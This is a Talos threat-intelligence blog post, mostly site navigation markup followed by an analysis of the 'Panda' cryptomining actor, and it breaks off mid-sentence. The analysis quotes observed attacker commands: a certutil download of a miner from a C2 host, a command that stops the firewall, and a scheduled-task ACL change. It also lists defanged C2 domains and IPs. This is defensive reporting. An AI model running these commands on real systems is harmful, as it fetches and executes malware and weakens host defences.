+                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
+                            </g>
+                        </svg>
+                        </div>
+                    </label>
+                    <div class="sub-nav sub-nav-multiple-list sub-nav-multiple-list-left">
+                        <div class="sub-nav-multiple-wrapper">
+                            <div class="sub-nav-list-top-of-mobile-wrapper">
+                                <h1 class="sub-nav-list-header sub-nav-list-top-of-mobile">Security Resources</h1>
+                                <ul class="sub-nav-list">
+                                    <li class="desktop-hide">
+                                        <label class="subnav-back-button" for="security-resources-sub-trigger">BACK</label>
+                                    </li>
+                                </ul>
+                            </div>
+                            <div class="sub-nav-list-item-wrapper">
+                                <span class="sub-nav-desktop-header uppercase">Security Resources</span>
+                                <ul class="sub-nav-list">
+                                    <li>
+                                        <a href="https://talosintelligence.com/software"><span>Open Source Security Tools</span>
+                                        </a></li>
+                                    <li>
+                                        <a href="https://talosintelligence.com/categories"><span>Intelligence Categories Reference</span>
+                                        </a></li>
+                                    <li>
+                                        <a href="https://talosintelligence.com/secure-endpoint-naming"><span>Secure Endpoint Naming Reference</span>
+                                        </a></li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="desktop-hide subnav-overlay"><!-- Generator: Adobe Illustrator 24.2.1, SVG Export Plug-In . SVG Version: 6.00 Build 0)  --><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 20 20" style="enable-background:new 0 0 20 20;" width="25px" height="25px" xml:space="preserve">
+                        <style type="text/css">
+                            .white{fill:#FFFFFF;}
+                        </style>
+                                                <path class="white" d="M19.4,17.1c0,0.1-0.1,0-0.2,0c0,0-1.3-0.9-2-1.4c-0.2-0.1-0.5-0.1-0.6,0.1c-0.3,0.3-0.6,0.8-0.9,1.3  c-0.1,0.2-0.1,0.5,0.1,0.6l2,1.5c0.1,0,0,0.1,0.1,0.2c0,0.1,0,0.1-0.1,0.2c-1.2,0.5-2.6,0.2-3.5-0.7c-0.8-0.9-1-2-0.7-3.1L4.5,6.5  c-1,0.3-2.3,0-3-0.9c-0.8-0.9-1.1-1.7-1-2.7c0-0.1,0-0.1,0.1-0.2c0.1,0,0.2,0.1,0.2,0.1l2,1.5C3,4.4,3.3,4.5,3.4,4.2  c0,0,0.5-0.8,0.9-1.3c0.1-0.2,0.1-0.5-0.1-0.6L2.3,0.9c-0.1,0,0-0.1-0.1-0.3c0-0.1,0-0.1,0.1-0.2C3.5-0.1,5,0.2,5.8,1.1  c0.8,0.9,1,2,0.7,3.1l9.1,9.3c1-0.3,2.3,0,3,0.9c0.7,0.7,0.9,1.5,0.9,2.5C19.5,16.9,19.5,17,19.4,17.1z"></path>
+                        </svg>
+                    </div>
+                </li>
+                <li class="nav-item">
+                    <div class="more-link-wrapper more-link-wrapper-mobile">
+                        <span class="more-nav-link">
+                            <div class="mobile-nav-icon"><!-- Generator: Adobe Illustrator 24.2.1, SVG Export Plug-In . SVG Version: 6.00 Build 0)  --><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 20 20" width="25px" height="25px" style="enable-background:new 0 0 20 20;" xml:space="preserve">
+                                <style type="text/css">
+                                    .sticoncomment{fill-rule:evenodd;clip-rule:evenodd;fill:#FFFFFF;}
+                                </style>
+                                <path class="sticoncomment" d="M13.6,7.1H6.4c-0.3,0-0.6-0.3-0.6-0.6c0-0.3,0.3-0.6,0.6-0.6l7.2,0c0.3,0,0.6,0.3,0.6,0.6  C14.2,6.8,13.9,7.1,13.6,7.1L13.6,7.1z M13.6,9.4H6.4c-0.3,0-0.6-0.3-0.6-0.6s0.3-0.6,0.6-0.6l7.2,0c0.3,0,0.6,0.3,0.6,0.6  C14.2,9.2,13.9,9.4,13.6,9.4L13.6,9.4z M11.5,11.7H6.4c-0.3,0-0.6-0.3-0.6-0.6c0-0.3,0.3-0.6,0.6-0.6h5.1c0.3,0,0.6,0.3,0.6,0.6  C12.1,11.5,11.8,11.7,11.5,11.7z M15.8,3H4.2C3.5,3,3,3.5,3,4.2V17l2.8-2.3h10c0.6,0,1.2-0.5,1.2-1.2V4.2C17,3.5,16.5,3,15.8,3  L15.8,3z"></path>
+                                </svg>
+                            </div>
+                            <span class="top-nav-link-text top-nav-more-text">
+                            Media
+                            </span>
+                        </span>
+                    </div>
+                    <input class="sub-nav-trigger" id="media-sub-trigger" type="checkbox">
+                    <label class="sub-nav-trigger-label" for="media-sub-trigger">
+                        <div class="mobile-nav-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
+                            <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
+                            <g>
+                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
+                            </g>
+                            </svg>
+                        </div>
+                    </label>
+                    <div class="sub-nav sub-nav-multiple-list sub-nav-multiple-list-middle">
+                        <div class="sub-nav-multiple-wrapper">
+                            <div class="sub-nav-list-top-of-mobile-wrapper">
+                                <h1 class="sub-nav-list-header sub-nav-list-top-of-mobile">Media</h1>
+                                <ul class="sub-nav-list">
+                                    <li class="desktop-hide">
+                                        <label class="subnav-back-button" for="media-sub-trigger">BACK</label>
+                                    </li>
+                                </ul>
+                            </div>
+                            <div class="sub-nav-list-item-wrapper">
+                                <span class="sub-nav-desktop-header uppercase">Media</span>
+                                <ul class="sub-nav-list">
+                                    <li>
+                                        <a href="https://blog.talosintelligence.com"><span>Talos Intelligence Blog</span>
+                                        </a></li>
+                                    <li>
+                                        <a href="https://blog.talosintelligence.com/category/threat-source-newsletter/"><span>Threat Source Newsletter</span>
+                                        </a></li>
+                                    <li>
+                                        <a href="https://talosintelligence.com/podcasts/shows/beers_with_talos"><span>Beers with Talos Podcast</span>
+                                        </a></li>
+                                    <li>
+                                        <a href="https://talosintelligence.com/podcasts/shows/talos_takes"><span>Talos Takes Podcast</span>
+                                        </a></li>
+                                    <li>
+                                        <a target="_blank" href="https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured"><span>Talos Videos</span>
+                                        </a></li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="desktop-hide subnav-overlay"><!-- Generator: Adobe Illustrator 24.2.1, SVG Export Plug-In . SVG Version: 6.00 Build 0)  --><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 20 20" width="25px" height="25px" style="enable-background:new 0 0 20 20;" xml:space="preserve">
+                        <style type="text/css">
+                            .sticoncomment{fill-rule:evenodd;clip-rule:evenodd;fill:#FFFFFF;}
+                        </style>
+                        <path class="sticoncomment" d="M13.6,7.1H6.4c-0.3,0-0.6-0.3-0.6-0.6c0-0.3,0.3-0.6,0.6-0.6l7.2,0c0.3,0,0.6,0.3,0.6,0.6  C14.2,6.8,13.9,7.1,13.6,7.1L13.6,7.1z M13.6,9.4H6.4c-0.3,0-0.6-0.3-0.6-0.6s0.3-0.6,0.6-0.6l7.2,0c0.3,0,0.6,0.3,0.6,0.6  C14.2,9.2,13.9,9.4,13.6,9.4L13.6,9.4z M11.5,11.7H6.4c-0.3,0-0.6-0.3-0.6-0.6c0-0.3,0.3-0.6,0.6-0.6h5.1c0.3,0,0.6,0.3,0.6,0.6  C12.1,11.5,11.8,11.7,11.5,11.7z M15.8,3H4.2C3.5,3,3,3.5,3,4.2V17l2.8-2.3h10c0.6,0,1.2-0.5,1.2-1.2V4.2C17,3.5,16.5,3,15.8,3  L15.8,3z"></path>
+                        </svg>
+                    </div>
+                </li>
+                <li class="nav-item">
+                    <div class="more-link-wrapper more-link-wrapper-mobile">
+                        <span class="more-nav-link">
+                            <div class="mobile-nav-icon">
+                                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="25px" height="25px" viewBox="0 0 55 55">
+                                <g>
+                                    <g class="mobile-nav-home">
+                                        <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M45.201,12.343c0.378,0.48,0.758,0.925,1.096,1.401    c2.975,4.207,4.543,8.876,4.494,14.044c-0.05,5.452-1.643,10.386-5.186,14.593c-3.484,4.133-7.929,6.73-13.182,7.895    c-6.313,1.398-12.216,0.275-17.695-3.131c-0.441-0.273-0.847-0.6-1.266-0.904c-0.11-0.078-0.208-0.174-0.337-0.287    c0.127-0.141,0.246-0.27,0.366-0.398c0.887-0.949,1.765-1.904,2.663-2.844c0.114-0.119,0.321-0.217,0.485-0.217    c3.658-0.006,7.318,0,10.975,0.008c3.458,0.006,6.913,0.02,10.369,0.02c0.957,0,1.871-0.193,2.62-0.844    c0.797-0.693,1.157-1.596,1.157-2.643c0.001-7.533,0.003-15.067-0.005-22.601c-0.002-0.309,0.088-0.524,0.3-0.743    C43.098,14.598,44.127,13.49,45.201,12.343"></path>
+                                        <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M41.402,8.822c-0.99,1.027-1.994,2.021-2.935,3.072    c-0.312,0.35-0.616,0.416-1.036,0.415c-6.98-0.009-13.957-0.007-20.938-0.007c-2.039,0-3.561,1.514-3.561,3.557    c0,6.504,0.002,13.008,0.006,19.512c0.002,0.973,0.011,1.943,0.004,2.914c0,0.133-0.04,0.301-0.127,0.393    c-1.069,1.162-2.15,2.314-3.229,3.469c-0.021,0.023-0.052,0.039-0.109,0.08c-0.159-0.188-0.323-0.369-0.471-0.562    c-2.535-3.348-4.119-7.102-4.605-11.268c-0.61-5.229,0.194-10.229,2.835-14.839c2.669-4.664,6.655-7.805,11.618-9.75    c3.205-1.257,6.533-1.852,9.977-1.621c4.478,0.298,8.553,1.754,12.227,4.325c0.101,0.072,0.197,0.151,0.291,0.229    C41.364,8.755,41.374,8.778,41.402,8.822"></path>
+                                        <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M39.799,12.47c0.873-0.911,1.749-1.829,2.676-2.797    c0.605,0.564,1.195,1.112,1.816,1.691c-0.941,0.985-1.817,1.903-2.703,2.83c-0.276-0.339-0.511-0.688-0.807-0.975    C40.492,12.941,40.145,12.728,39.799,12.47"></path>
+                                        <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M10.35,43.279c0.969-1.016,1.885-1.977,2.76-2.893    c0.213,0.369,0.376,0.762,0.639,1.072c0.265,0.312,0.627,0.539,0.98,0.832c-0.853,0.891-1.713,1.791-2.624,2.746    C11.513,44.445,10.939,43.869,10.35,43.279"></path>
+                                    </g>
+                                </g>
+                                </svg>
+                            </div>
+                            <span class="top-nav-link-text top-nav-more-text">
+                            Company
+                            </span>
+                        </span>
+                    </div>
+                    <input class="sub-nav-trigger" id="company-sub-trigger" type="checkbox">
+                    <label class="sub-nav-trigger-label" for="company-sub-trigger">
+                        <div class="mobile-nav-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
+                            <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
+                            <g>
+                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
+                            </g>
+                        </svg>
+                        </div>
+                    </label>
+                    <div class="sub-nav sub-nav-multiple-list sub-nav-multiple-list-right">
+                        <div class="sub-nav-multiple-wrapper">
+                            <div class="sub-nav-list-top-of-mobile-wrapper">
+                                <h1 class="sub-nav-list-header sub-nav-list-top-of-mobile">Company</h1>
+                                <ul class="sub-nav-list">
+                                    <li class="desktop-hide">
+                                        <label class="subnav-back-button" for="company-sub-trigger">BACK</label>
+                                    </li>
+                                </ul>
+                            </div>
+                            <div class="sub-nav-list-item-wrapper">
+                                <span class="sub-nav-desktop-header uppercase">Company</span>
+                                <ul class="sub-nav-list">
+                                    <li>
+                                        <a href="https://talosintelligence.com/about"><span>About Talos</span>
+                                        </a></li>
+                                    <li>
+                                        <a href="https://talosintelligence.com/careers"><span>Careers</span>
+                                        </a></li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="desktop-hide subnav-overlay"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="25px" height="25px" viewBox="0 0 55 55">
+                        <g>
+                            <g class="mobile-nav-home">
+                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M45.201,12.343c0.378,0.48,0.758,0.925,1.096,1.401    c2.975,4.207,4.543,8.876,4.494,14.044c-0.05,5.452-1.643,10.386-5.186,14.593c-3.484,4.133-7.929,6.73-13.182,7.895    c-6.313,1.398-12.216,0.275-17.695-3.131c-0.441-0.273-0.847-0.6-1.266-0.904c-0.11-0.078-0.208-0.174-0.337-0.287    c0.127-0.141,0.246-0.27,0.366-0.398c0.887-0.949,1.765-1.904,2.663-2.844c0.114-0.119,0.321-0.217,0.485-0.217    c3.658-0.006,7.318,0,10.975,0.008c3.458,0.006,6.913,0.02,10.369,0.02c0.957,0,1.871-0.193,2.62-0.844    c0.797-0.693,1.157-1.596,1.157-2.643c0.001-7.533,0.003-15.067-0.005-22.601c-0.002-0.309,0.088-0.524,0.3-0.743    C43.098,14.598,44.127,13.49,45.201,12.343"></path>
+                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M41.402,8.822c-0.99,1.027-1.994,2.021-2.935,3.072    c-0.312,0.35-0.616,0.416-1.036,0.415c-6.98-0.009-13.957-0.007-20.938-0.007c-2.039,0-3.561,1.514-3.561,3.557    c0,6.504,0.002,13.008,0.006,19.512c0.002,0.973,0.011,1.943,0.004,2.914c0,0.133-0.04,0.301-0.127,0.393    c-1.069,1.162-2.15,2.314-3.229,3.469c-0.021,0.023-0.052,0.039-0.109,0.08c-0.159-0.188-0.323-0.369-0.471-0.562    c-2.535-3.348-4.119-7.102-4.605-11.268c-0.61-5.229,0.194-10.229,2.835-14.839c2.669-4.664,6.655-7.805,11.618-9.75    c3.205-1.257,6.533-1.852,9.977-1.621c4.478,0.298,8.553,1.754,12.227,4.325c0.101,0.072,0.197,0.151,0.291,0.229    C41.364,8.755,41.374,8.778,41.402,8.822"></path>
+                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M39.799,12.47c0.873-0.911,1.749-1.829,2.676-2.797    c0.605,0.564,1.195,1.112,1.816,1.691c-0.941,0.985-1.817,1.903-2.703,2.83c-0.276-0.339-0.511-0.688-0.807-0.975    C40.492,12.941,40.145,12.728,39.799,12.47"></path>
+                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M10.35,43.279c0.969-1.016,1.885-1.977,2.76-2.893    c0.213,0.369,0.376,0.762,0.639,1.072c0.265,0.312,0.627,0.539,0.98,0.832c-0.853,0.891-1.713,1.791-2.624,2.746    C11.513,44.445,10.939,43.869,10.35,43.279"></path>
+                            </g>
+                        </g>
+                    </svg>
+                    </div>
+                </li>
+            </ul>
+            <div class="nav-search-wrapper" id="desktop-search-wrapper">
+                <button class="search-button desktop-search-button" data-ghost-search>
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
+                </button>
+            </div>
+        </div>
+
+
+
+    </div>
+</nav>
+
+    
+
+    <main id="site-main">
+        <div class="container-fluid px-0">
+            <div class="main-content-row">
+                <div class="main-content-col px-0">
+                    <div class="post-full-content">
+                        
+<article class="post tag-cryptocurrency ">
+        <div class="feature-image-wrapper my-5">
+            <figure>
+                <img src="https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/-lf0T3p1bzKg/XYDfgN1h6mI/AAAAAAAAB7o/HvFMxzb8QhQbUO85JND7yrZfjwu7xAfTACLcBGAsYHQ/w1200-h630-p-k-no-nu/image4.png" alt="" class="img-fluid" />
+            </figure>
+        </div>
+
+    <h1 class="text-center">Cryptocurrency miners aren’t dead yet: Documenting the voracious but simple “Panda”</h1>
+
+    <div class="text-center m-1">
+        <div class="post-author">
+            <span>By </span>
+                <a href="https://blog.talosintelligence.com/author/nick-biasini/">Nick Biasini</a>
+        </div>
+
+        <br/>
+        <time class="post-datetime" datetime="September 17, 2019 11:09">
+            Tuesday, September 17, 2019 11:09
+        </time>
+
+        <div class="m-3">
+                            <a href="/category/cryptocurrency/" class="category primary-category">
+                                Cryptocurrency
+                            </a>
+                                </div>
+    </div>
+
+    <section class="post-content-wrapper mt-5">
+        <div class="post-content" id="post-content">
+            <p><i>By <a href="https://twitter.com/ccevans002">Christopher Evans</a> and <a href="https://twitter.com/ChinaHandDave">David Liebenberg</a>.</i><br></p><h2 id="executive-summary-a-new-threat-actor-named-panda-has-generated-thousands-of-dollars-worth-of-the-monero-cryptocurrency-through-the-use-of-remote-access-tools-rats-and-illicit-cryptocurrency-mining-malware-this-is-far-from-the-most-sophisticated-actor-we-ve-ever-seen-but-it-still-has-been-one-of-the-most-active-attackers-we-ve-seen-in-cisco-talos-threat-trap-data-panda-s-willingness-to-persistently-exploit-vulnerable-web-applications-worldwide-their-tools-allowing-them-to-traverse-throughout-networks-and-their-use-of-rats-means-that-organizations-worldwide-are-at-risk-of-having-their-system-resources-misused-for-mining-purposes-or-worse-such-as-exfiltration-of-valuable-information-">Executive summary A new threat actor named "Panda" has generated thousands of dollars worth of the Monero cryptocurrency through the use of remote access tools (RATs) and illicit cryptocurrency-mining malware. This is far from the most sophisticated actor we've ever seen, but it still has been one of the most active attackers we've seen in Cisco Talos threat trap data. Panda's willingness to persistently exploit vulnerable web applications worldwide, their tools allowing them to traverse throughout networks, and their use of RATs, means that organizations worldwide are at risk of having their system resources misused for mining purposes or worse, such as exfiltration of valuable information.</h2><p>Panda has shown time and again they will update their infrastructure and exploits on the fly as security researchers publicize indicators of compromises and proof of concepts. Our threat traps show that Panda uses exploits previously used by Shadow Brokers — a group infamous for publishing information from the National Security Agency — and Mimikatz, an open-source credential-dumping program.</p><p>Talos first became aware of Panda in the summer of 2018, when they were engaging in the successful and widespread "MassMiner" campaign. Shortly thereafter, we linked Panda to another widespread illicit mining campaign with a different set of command and control (C2) servers. Since then, this actor has updated its infrastructure, exploits and payloads. We believe Panda is a legitimate threat capable of spreading cryptocurrency miners that can use up valuable computing resources and slow down networks and systems. Talos confirmed that organizations in the banking, healthcare, transportation, telecommunications, IT services industries were affected in these campaigns.<br></p><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/-lf0T3p1bzKg/XYDfgN1h6mI/AAAAAAAAB7o/HvFMxzb8QhQbUO85JND7yrZfjwu7xAfTACLcBGAsYHQ/s640/image4.png" class="kg-image" alt loading="lazy"></figure><h2 id="first-sightings-of-the-not-so-elusive-panda-we-first-observed-this-actor-in-july-of-2018-exploiting-a-weblogic-vulnerability-cve-2017-10271-to-drop-a-miner-that-was-associated-with-a-campaign-called-massminer-through-the-wallet-infrastructure-and-post-exploit-powershell-commands-used-">First sightings of the not-so-elusive Panda We first observed this actor in July of 2018 exploiting a WebLogic vulnerability (<a href="https://nvd.nist.gov/vuln/detail/CVE-2017-10271">CVE-2017-10271</a>) to drop a miner that was associated with a campaign called "<a href="https://www.alienvault.com/blogs/labs-research/massminer-malware-targeting-web-servers">MassMiner</a>" through the wallet, infrastructure, and post-exploit PowerShell commands used.</h2><p>Panda used massscan to look for a variety of different vulnerable servers and then exploited several different vulnerabilities, including the aforementioned Oracle bug and a remote code execution vulnerability in Apache Struts 2 (<a href="https://blog.talosintelligence.com/apache-0-day-exploited">CVE-2017-5638</a>). They used PowerShell post-exploit to download a miner payload called "downloader.exe," saving it in the TEMP folder under a simple number filename such as "13.exe" and executing it. The sample attempts to download a config file from list[.]idc3389[.]top over port 57890, as well as kingminer[.]club. The config file specifies the Monero wallet to be used as well as the mining pool. In all, we estimate that Panda has amassed an amount of Monero that is currently valued at roughly $100,000.</p><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/-7Ed1781BBr4/XYDfrwNRtKI/AAAAAAAAB7s/nxr6w2FndDcpsmMKiH8a45uPRZmxCy3FgCLcBGAsYHQ/s640/image6.png" class="kg-image" alt loading="lazy"></figure><p><br> By October 2018, the config file on list[.]idc3389[.]top, which was then an instance of an HttpFileServer (HFS), had been downloaded more than 300,000 times.</p><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/-fpXoN_jw0UU/XYDfx_msBlI/AAAAAAAAB70/SEJLWIIEjUI0rt_HBXROjCsy3KH2RXUrACLcBGAsYHQ/s640/image5.png" class="kg-image" alt loading="lazy"></figure><p>The sample also installs Gh0st RAT, which communicates with the domain rat[.]kingminer[.]club. In several samples, we also observed Panda dropping other hacking tools and exploits. This includes the credential-theft tool Mimikatz and UPX-packed artifacts related to the Equation Group set of exploits. The samples also appear to scan for open SMB ports by reaching out over port 445 to IP addresses in the 172.105.X.X block.</p><p>One of Panda's C2 domains, idc3389[.]top, was registered to a Chinese-speaking actor, who went by the name "Panda."</p><h2 id="bulehero-connection-around-the-same-time-that-we-first-observed-these-initial-panda-attacks-we-observed-very-similar-ttps-in-an-attack-using-another-c2-domain-bulehero-in-the-actors-used-powershell-to-download-a-file-called-download-exe-from-b-bulehero-in-and-similarly-save-it-as-another-simple-number-filename-such-as-13-exe-and-execute-it-the-file-server-turned-out-to-be-an-instance-of-hfs-hosting-four-malicious-files-">Bulehero connection Around the same time that we first observed these initial Panda attacks, we observed very similar TTPs in an attack using another C2 domain: bulehero[.]in. The actors used PowerShell to download a file called "download.exe" from b[.]bulehero[.]in, and similarly, save it as another simple number filename such as "13.exe" and execute it. The file server turned out to be an instance of HFS hosting four malicious files.</h2><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/-GbyctYMnyRo/XYDgCR5tbSI/AAAAAAAAB78/3xs1gHqsMD8svymJLjA81TtAbCC4XsTZwCLcBGAsYHQ/s640/image8.png" class="kg-image" alt loading="lazy"></figure><p><br> Running the sample in our sandboxes, we observed several elements that connect it to the earlier MassMiner campaign. First, it issues a GET request for a file called cfg.ini hosted on a different subdomain of bulehero[.]in, c[.]bulehero[.]in, over the previously observed port 57890. Consistent with MassMiner, the config file specifies the site from which the original sample came, as well as the wallet and mining pool to be used for mining.</p><p>Additionally, the sample attempts to shut down the victim's firewall with commands such as "cmd /c net stop MpsSvc". The malware also modifies the access control list to grant full access to certain files through running cacsl.exe.</p><p>For example:</p><!--kg-card-begin: html--><blockquote><p>cmd /c schtasks /create /sc minute /mo 1 /tn "Netframework" /ru system /tr "cmd /c echo Y|cacls C:\Windows\appveif.exe /p everyone:F</p>
+</blockquote><!--kg-card-end: html--><p>Both of these behaviors have also been observed in previous MassMiner infections.</p><p>The malware also issues a GET request to Chinese-language IP geolocation service ip138[.]com for a resource named ic.asp which provides the machine's IP address and location in Chinese. This behavior was also observed in the MassMiner campaign.</p><p>Additionally, appveif.exe creates a number of files in the system directory. Many of these files were determined to be malicious by multiple AV engines and appear to match the exploits of vulnerabilities targeted in the MassMiner campaign. For instance, several artifacts were detected as being related to the "Shadow Brokers" exploits and were installed in a suspiciously named directory: "\Windows\InfusedAppe\Eternalblue139\specials\".</p><h2 id="evolution-of-panda-in-january-of-2019-talos-analysts-observed-panda-exploiting-a-recently-disclosed-vulnerability-in-the-thinkphp-web-framework-cnvd-2018-24942-in-order-to-spread-similar-malware-thinkphp-is-an-open-source-web-framework-popular-in-china-">Evolution of Panda In January of 2019, Talos analysts observed Panda exploiting a recently disclosed vulnerability in the ThinkPHP web framework (CNVD-2018-24942) in order to spread similar malware. ThinkPHP is an open-source web framework popular in China.</h2><p>Panda used this vulnerability to both directly download a file called "download.exe" from a46[.]bulehero[.]in and upload a simple PHP web shell to the path "/public/hydra.php", which is subsequently used to invoke PowerShell to download the same executable file. The web shell provides only the ability to invoke arbitrary system commands through URL parameters in an HTTP request to "/public/hydra.php". Download.exe would download the illicit miner payload and also engages in SMB scanning, evidence of Panda's attempt to move laterally within compromised organizations.</p><p>In March 2019, we observed the actor leveraging new infrastructure, including various subdomains of the domain hognoob[.]se. At the time, the domain hosting the initial payload, fid[.]hognoob[.]se, resolved to the IP address 195[.]128[.]126[.]241, which was also associated with several subdomains of bulehero[.]in.</p><p>At the time, the actor's tactics, techniques, and procedures (TTPs) remained similar to those used before. Post-exploit, Panda invokes PowerShell to download an executable called "download.exe" from the URL hxxp://fid[.]hognoob[.]se/download.exe and save it in the Temp folder, although Panda now saved it under a high-entropy filename i.e. 'C:/Windows/temp/autzipmfvidixxr7407.exe'. This file then downloads a Monero mining trojan named "wercplshost.exe" from fid[.]hognoob[.]se as well as a configuration file called "cfg.ini" from uio[.]hognoob[.]se, which provides configuration details for the miner.</p><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/-6B6MTCm_3U8/XYDgMB6l-xI/AAAAAAAAB8A/g3ux2o0d2KgGC-H6Sy9BiLx4KUTSo8LwQCLcBGAsYHQ/s640/image7.png" class="kg-image" alt loading="lazy"></figure><p><br> "Wercplshost.exe" contains exploit modules designed for lateral movement, many of which are related to the "Shadow Brokers" exploits, and engages in SMB brute-forcing. The sample acquires the victim's internal IP and reaches out to Chinese-language IP geolocation site 2019[.]ip138[.]com to get the external IP, using the victim's Class B address as a basis for port scanning. It also uses the open-source tool Mimikatz to collect victim passwords.</p><p>Soon thereafter, Panda began leveraging an updated payload. Some of the new features of the payload include using Certutil to download the secondary miner payload through the command: "certutil.exe -urlcache -split -f http://fid[.]hognoob[.]se/upnpprhost.exe C:\Windows\Temp\upnpprhost.exe". The coinminer is also run using the command "cmd /c ping 127.0.0.1 -n 5 &amp; Start C:\Windows\ugrpkute\[filename].exe".</p><p>The updated payload still includes exploit modules designed for lateral movement, many of which are related to the "Shadow Brokers" exploits. One departure, however, is previously observed samples acquire the victim's internal IP and reach out to Chinese-language IP geolocation site 2019[.]ip138[.]com to get the external IP, using the victim's Class B address as a basis for port scanning. This sample installs WinPcap and open-source tool Masscan and scans for open ports on public IP addresses saving the results to "Scant.txt" (note the typo). The sample also writes a list of hardcoded IP ranges to "ip.txt" and passes it to Masscan to scan for port 445 and saves the results to "results.txt." This is potentially intended to find machines vulnerable to MS17-010, given the actor's history of using EternalBlue. The payload also leverages previously-used tools, launching Mimikatz to collect victim passwords</p><p>In June, Panda began targeting a newer WebLogic vulnerability, <a href="https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html">CVE-2019-2725</a>, but their TTPs remained the same.</p><h2 id="recent-activity-panda-began-employing-new-c2-and-payload-hosting-infrastructure-over-the-past-month-we-observed-several-attacker-ips-post-exploit-pulling-down-payloads-from-the-url-hxxp-wiu-fxxxxxxk-me-download-exe-and-saving-it-under-a-random-20-character-name-with-the-first-15-characters-consisting-of-a-z-characters-and-the-last-five-consisting-of-digits-e-g-xblzcdsafdmqslz19595-exe-panda-then-executes-the-file-via-powershell-wiu-fxxxxxxk-me-resolves-to-the-ip-3-123-17-223-which-is-associated-with-older-panda-c2s-including-a46-bulehero-in-and-fid-hognoob-se-">Recent activity Panda began employing new C2 and payload-hosting infrastructure over the past month. We observed several attacker IPs post-exploit pulling down payloads from the URL hxxp[:]//wiu[.]fxxxxxxk[.]me/download.exe and saving it under a random 20-character name, with the first 15 characters consisting of "a" - "z" characters and the last five consisting of digits (e.g., "xblzcdsafdmqslz19595.exe"). Panda then executes the file via PowerShell. Wiu[.]fxxxxxxk[.]me resolves to the IP 3[.]123[.]17[.]223, which is associated with older Panda C2s including a46[.]bulehero[.]in and fid[.]hognoob[.]se.</h2><p>Besides the new infrastructure, the payload is relatively similar to the one they began using in May 2019, including using Certutil to download the secondary miner payload located at hxxp[:]//wiu[.]fxxxxxxk[.]me/sppuihost.exe and using ping to delay execution of this payload. The sample also includes Panda's usual lateral movement modules that include Shadow Brokers' exploits and Mimikatz.</p><p>One difference is that several samples contained a Gh0st RAT default mutex "DOWNLOAD_SHELL_MUTEX_NAME" with the mutex name listed as fxxk[.]noilwut0vv[.]club:9898. The sample also made a DNS request for this domain. The domain resolved to the IP 46[.]173[.]217[.]80, which is also associated with several subdomains of fxxxxxxk[.]me and older Panda C2 hognoob[.]se. Combining mining capabilities and Gh0st RAT represents a return to Panda's earlier behavior.</p><p>On August 19, 2019, we observed that Panda has added another set of domains to his inventory of C2 and payload-hosting infrastructure. In line with his previous campaigns, we observed multiple attacker IPs pulling down payloads from the URL hxxp[:]//cb[.]f*ckingmy[.]life/download.exe. In a slight departure from previous behavior, the file was saved as "BBBBB,", 